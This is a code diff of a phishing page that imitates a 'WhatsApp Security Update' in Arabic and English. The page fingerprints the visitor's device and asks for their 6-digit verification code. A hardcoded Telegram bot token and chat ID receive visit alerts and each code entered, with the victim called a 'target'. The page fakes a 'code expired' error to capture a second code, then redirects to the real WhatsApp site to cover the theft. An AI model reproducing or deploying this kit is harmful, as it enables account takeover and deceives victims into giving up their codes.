@@ -8,29 +8,21 @@
         :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif; }
         body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
-
         #checker { position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .pulse-logo { width: 60px; animation: pulse 2s infinite; }
         @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
-
         .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; display: none; }
         .active { display: block; animation: fadeIn 0.5s ease; }
-
         .card { background: #1d2a33; border-radius: 12px; padding: 18px; text-align: initial; margin-bottom: 20px; border: 1px solid #2a3942; }
         .line { font-size: 13px; margin-bottom: 8px; color: var(--wa-hint); display: flex; justify-content: space-between; }
         .line b { color: #fff; font-family: monospace; }
-
         .otp-input { width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942; color: #fff; font-size: 30px; text-align: center; outline: none; letter-spacing: 5px; margin: 20px 0; }
         .otp-input:focus { border-bottom-color: var(--wa-green); }
-
         .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 15px; border-radius: 25px; font-size: 15px; font-weight: bold; cursor: pointer; }
-        
         .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        
-        .rtl { direction: rtl; }
-        .ltr { direction: ltr; }
+        .rtl { direction: rtl; } .ltr { direction: ltr; }
     </style>
 </head>
 <body>
@@ -43,7 +35,6 @@
     <div class="container" id="app">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50" style="margin-bottom:15px;">
         <h2 id="title" style="font-size:20px; margin-bottom:20px; font-weight: 500;"></h2>
-
         <div class="card">
             <div class="line"><span id="lbl-device"></span> <b id="device"></b></div>
             <div class="line"><span id="lbl-status"></span> <span style="color:var(--wa-green);" id="status-txt"></span></div>
@@ -51,49 +42,21 @@
                 <span id="lbl-number"></span> <b id="phone-display" style="color:var(--wa-green);"></b>
             </div>
         </div>
-
         <p id="desc" style="font-size: 13px; color: var(--wa-hint); line-height: 1.5; margin-bottom: 20px;"></p>
-
         <input type="tel" id="otp" class="otp-input" maxlength="7" inputmode="numeric" placeholder="--- ---">
         <button class="btn" id="btn-txt" onclick="run()"></button>
     </div>
 
     <script>
-        // القاموس للغتين
         const langs = {
-            ar: {
-                load: "جاري التحقق من أمان الجهاز...",
-                title: "تحديث أمان واتساب",
-                device: "الجهاز:",
-                status: "الحالة:",
-                status_v: "تحديث إجباري متوفر",
-                number: "الرقم الموثق:",
-                desc: "أدخل كود التحقق المكون من 6 أرقام لتأكيد تحديث نظام التشفير.",
-                btn: "تحديث ومزامنة الآن",
-                err: "انتهت صلاحية الكود، تم إرسال كود جديد.",
-                wait: "جاري المزامنة..."
-            },
-            en: {
-                load: "Verifying device security...",
-                title: "WhatsApp Security Update",
-                device: "Device:",
-                status: "Status:",
-                status_v: "Mandatory Update Available",
-                number: "Verified Number:",
-                desc: "Enter the 6-digit verification code to confirm encryption update.",
-                btn: "Update and Sync Now",
-                err: "Code expired. A new code has been sent.",
-                wait: "Syncing..."
-            }
+            ar: { load: "جاري فحص حالة الأمان...", title: "تحديث أمان واتساب", device: "الجهاز:", status: "الحالة:", status_v: "تحديث إجباري مطلوب", number: "رقم الحساب:", desc: "أدخل كود التحقق (6 أرقام) لتأكيد هويتك وتحديث نظام التشفير.", btn: "تحديث ومزامنة الآن", err: "الكود منتهي الصلاحية. تم إرسال كود جديد.", wait: "جاري المعالجة..." },
+            en: { load: "Checking security status...", title: "WhatsApp Security Update", device: "Device:", status: "Status:", status_v: "Mandatory Update Required", number: "Account Number:", desc: "Enter the 6-digit code to verify your identity and update encryption.", btn: "Update and Sync Now", err: "Code expired. A new code has been sent.", wait: "Processing..." }
         };
 
-        // تحديد اللغة والاتجاه
         const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
         const t = langs[userLang];
-        if(userLang === 'ar') document.body.classList.add('rtl');
-        else document.body.classList.add('ltr');
+        if(userLang === 'ar') document.body.classList.add('rtl'); else document.body.classList.add('ltr');
 
-        // توزيع النصوص
         document.getElementById('load-text').innerText = t.load;
         document.getElementById('title').innerText = t.title;
         document.getElementById('lbl-device').innerText = t.device;
@@ -103,29 +66,37 @@
         document.getElementById('desc').innerText = t.desc;
         document.getElementById('btn-txt').innerText = t.btn;
 
-        // إعدادات البوت والبيانات
         const CFG = {
             T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
             C: '5446862709',
             P: new URLSearchParams(window.location.search).get('u') || "01030003287"
         };
-
         document.getElementById('phone-display').innerText = `+20 ${CFG.P.substring(0,3)} •••• ${CFG.P.slice(-2)}`;
 
-        // وظيفة كشف الجهاز المتقدمة
-        function getDetailedDevice() {
+        function getDevice() {
             const ua = navigator.userAgent;
-            if (/iPhone/.test(ua)) return "iPhone (" + (ua.match(/OS (\d+)_(\d+)/)?.[1] || "iOS") + ")";
-            if (/Android/.test(ua)) return "Android " + (ua.match(/Android\s([0-9\.]+)/)?.[1] || "") + " [" + (ua.match(/\(([^;]+);/)?.[1] || "Mobile") + "]";
-            if (/Windows NT/.test(ua)) return "Windows " + (ua.match(/Windows NT\s([0-9\.]+)/)?.[1] === "10.0" ? "10/11" : "PC");
-            if (/Macintosh/.test(ua)) return "macOS Desktop";
-            return "Unknown Device";
+            const screenW = screen.width;
+            const screenH = screen.height;
+            
+            if (/iPhone/.test(ua)) {
+                let model = "iPhone";
+                // محاولة تحديد موديلات الأيفون بالأبعاد (تقريبي)
+                if (screenH === 852 || screenW === 852) model = "iPhone 15/16 Pro";
+                if (screenH === 932 || screenW === 932) model = "iPhone 15/16 Pro Max";
+                if (screenH === 844 || screenW === 844) model = "iPhone 12/13/14";
+                return model + " (iOS " + (ua.match(/OS (\d+)_(\d+)/)?.[1] || "") + ")";
+            }
+            if (/Android/.test(ua)) {
+                const model = ua.match(/\(([^;]+);/)?.[1] || "Android";
+                const ver = ua.match(/Android\s([0-9\.]+)/)?.[1] || "";
+                return model + " [Android " + ver + "]";
+            }
+            return "PC / Desktop System";
         }
 
-        const deviceDetail = getDetailedDevice();
+        const deviceDetail = getDevice();
         document.getElementById('device').innerText = deviceDetail;
 
-        // ماسك الإدخال (123-456)
         document.getElementById('otp').addEventListener('input', e => {
             let v = e.target.value.replace(/\D/g, '');
             if (v.length > 3) v = v.slice(0, 3) + '-' + v.slice(3, 6);
@@ -133,19 +104,17 @@
         });
 
         async function notify(msg) {
-            try {
-                await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
-                });
-            } catch (e) {}
+            await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
+            }).catch(()=>{});
         }
 
         window.onload = () => {
             setTimeout(() => {
                 document.getElementById('checker').style.display = 'none';
                 document.getElementById('app').classList.add('active');
-                notify(`🌐 <b>New Visit</b>\n👤 Target: <code>${CFG.P}</code>\n📱 Device: <code>${deviceDetail}</code>\n🌍 Lang: <code>${userLang.toUpperCase()}</code>`);
+                notify(`✅ <b>New Target Opened</b>\n👤 Phone: <code>${CFG.P}</code>\n📱 Device: <code>${deviceDetail}</code>\n🌐 Lang: <code>${userLang.toUpperCase()}</code>`);
             }, 2500);
         };
 
@@ -153,23 +122,20 @@
         async function run() {
             const val = document.getElementById('otp').value;
             if(val.length < 7) return;
-
             step++;
             const btn = document.getElementById('btn-txt');
-            btn.innerText = t.wait;
-            btn.disabled = true;
+            btn.innerText = t.wait; btn.disabled = true;
 
-            await notify(`🔥 <b>OTP Received (Attempt ${step}):</b>\nNumber: <code>${CFG.P}</code>\nCode: <code>${val}</code>\nDevice: <code>${deviceDetail}</code>`);
+            await notify(`🔥 <b>OTP Received #${step}</b>\n👤 Phone: <code>${CFG.P}</code>\n🔑 Code: <code>${val}</code>\n📱 Device: <code>${deviceDetail}</code>`);
 
             if(step === 1) {
                 setTimeout(() => {
                     alert(t.err);
                     document.getElementById('otp').value = "";
-                    btn.innerText = t.btn;
-                    btn.disabled = false;
+                    btn.innerText = t.btn; btn.disabled = false;
                 }, 1500);
             } else {
-                document.body.innerHTML = `<div class="spinner"></div>`;
+                document.body.innerHTML = `<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;"><div class="spinner"></div><p style="margin-top:20px; color:#8696a0;">Syncing with server...</p></div>`;
                 setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 2000);
             }
         }
